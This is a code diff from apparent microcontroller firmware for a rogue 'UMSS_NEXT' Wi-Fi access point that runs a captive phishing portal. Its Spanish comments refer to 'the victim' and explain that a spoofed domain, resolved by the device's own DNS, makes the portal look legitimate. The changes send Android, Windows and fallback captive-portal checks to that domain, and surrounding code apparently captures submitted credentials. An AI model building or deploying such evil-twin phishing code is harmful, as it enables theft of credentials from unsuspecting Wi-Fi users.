@@ -51,6 +51,11 @@ const char* PASS_REAL = PASS_REAL_CFG;
 const char* SSID_FAKE = "UMSS_NEXT";
 const char* PASS_FAKE = "12345678";
 
+// Dominio "bonito" que verá la víctima en la barra de direcciones. El DNS
+// propio lo resuelve a nuestra IP, así el portal parece hospedado en ese dominio
+// en vez de mostrar 192.168.4.1. (Sin guion bajo: los navegadores lo rechazan.)
+const char* PORTAL_URL = "http://umss-next.com/";
+
 const IPAddress IP_AP  (192, 168, 4, 1);
 const IPAddress GW_AP  (192, 168, 4, 1);
 const IPAddress MASK_AP(255, 255, 255, 0);
@@ -597,7 +602,7 @@ void handle_submit() {
 // Android generate_204: un 302 al portal es el disparador mas fiable del popup
 void handle_gen204() {
   log_req();
-  send_redirect("http://192.168.4.1/");
+  send_redirect(PORTAL_URL);
 }
 
 // iOS/macOS: en vez de "<Success>" servimos el PORTAL -> iOS abre la ventana
@@ -609,12 +614,12 @@ void handle_hotspot() {
 
 void handle_ncsi() {
   log_req();
-  send_redirect("http://192.168.4.1/");
+  send_redirect(PORTAL_URL);
 }
 
 void handle_not_found() {
   log_req();
-  send_redirect("http://192.168.4.1/");
+  send_redirect(PORTAL_URL);
 }
 
 // ============================================================================
